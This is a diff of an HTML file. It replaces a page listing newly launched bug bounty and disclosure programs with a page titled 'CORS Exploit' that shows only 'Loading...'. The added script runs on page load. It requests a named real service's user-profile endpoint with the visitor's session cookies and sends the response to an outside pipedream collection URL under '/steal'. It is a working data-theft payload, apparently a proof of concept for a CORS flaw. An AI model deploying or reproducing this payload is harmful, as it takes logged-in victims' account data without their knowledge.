@@ -1,70 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="google-adsense-account" content="ca-pub-7004738544552460">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Newly Launched Self-Hosted BB, RDP, VDP</title>
-    <link rel="stylesheet" href="style.css">
+    <title>CORS Exploit</title>
 </head>
 <body>
-    <header>
-        <!-- <h2>For Beginners, There's a Lower Chance of Duplicates and N/A</h2> --><br>
-	<img src="image.jpg" width=200px height=182px>
-    </header>
-    
-    <main>
-        <section id="intro">
-            <h2>Newly Launched Bug Bounties & VDP Programs</h2>
-            <p>Explore the top 5 latest bug bounty, RDP, and VDP programs. Updated regularly, offering you the best new opportunities for vulnerability discoveries.</p>
-        </section>
-        
-        <section id="programs-list">
-            <h2>Top 5 Programs</h2>
-            <div class="programs-container">
-                <div class="program-card">
-                    <img src="https://cdn.prod.website-files.com/66c5d9bfaf0993a53a4bbec3/66cc92803d030e659c5eb5eb_favicon_small.png" alt="Program 1 Image">
-                    <h3>neoshare AG</h3>
-                    <p>Launch Date: <span class="launch-date">17 September 2024</span></p>
-                    <a href="https://www.neoshare.de/responsible-disclosure-program" target="_blank">Click to See The Details</a>
-                </div>
-		<div class="program-card">
-                    <img src="https://www.apifonica.com/public/img/favicon/favicon-32x32.png" alt="Program 2 Image">
-                    <h3>Apifonica</h3>
-                    <p>Launch Date: <span class="launch-date">1 September 2024</span></p>
-                    <a href="https://www.apifonica.com/public/legal/apifonica_responsible_disclosure_policy.pdf" target="_blank">Click to See The Details</a>
-                </div>
-		<div class="program-card">
-                    <img src="https://cdn.prod.website-files.com/665dd9f1457b93f61917011b/668690c934e31d8196b2b17e_favicon.png" alt="Program 3 Image">
-                    <h3>DebtCo</h3>
-                    <p>Launch Date: <span class="launch-date">13 June 2024</span></p>
-                    <a href="https://www.debtco.io/legal-uk/disclosure" target="_blank">Click to See The Details</a>
-                </div>
-		<div class="program-card">
-                    <img src="https://rangde.imgix.net/rangde-logo.svg" alt="Program 4 Image">
-                    <h3>RangDe</h3>
-                    <p>Launch Date: <span class="launch-date">10 May 2024</span></p>
-                    <a href="https://rangde.in/vulnerability-disclosure-program" target="_blank">Click to See The Details</a>
-                </div>
-		<div class="program-card">
-                    <img src="https://unguess.io/wp-content/uploads/2022/12/cropped-favicon-32x32.webp" alt="Program 5 Image">
-                    <h3>UNGUESS</h3>
-                    <p>Launch Date: <span class="launch-date">25 January 2024</span></p>
-                    <a href="https://unguess.io/bug-bounty-program/" target="_blank">Click to See The Details</a>
-                </div>
-            </div>
-        </section><br><br>
-	<section id="intro">
-            <h2>Why Join These Programs?</h2>
-            <p>Discover exclusive opportunities to make an impact by identifying vulnerabilities before others. These self-hosted platforms are often overlooked, but offer great rewards and recognition.</p>
-            <p>Our handpicked programs provide flexibility, ranging from bug bounties on smaller, self-hosted projects to VDPs with clear scopes and guidelines.</p>
-        </section>
-    </main>
-	<center>
-	<footer>
-	<p>If we missed something, please email us at bug.te8t@gmail.com</p>
-	</footer><br>
-	</center>
-
+    <h2>Loading...</h2>
+    <script>
+        // Exploit: Send request to the vulnerable API and steal data
+        fetch("https://accounts-api.soco.id/user/me", {
+            credentials: "include" // Send victim's session cookies
+        })
+        .then(response => response.text()) // Extract response data
+        .then(data => {
+            // Send stolen data to attacker's server
+            fetch("https://eo4jfffzz6pk7y9.m.pipedream.net/steal?data=" + encodeURIComponent(data));
+        });
+    </script>
 </body>
 </html>
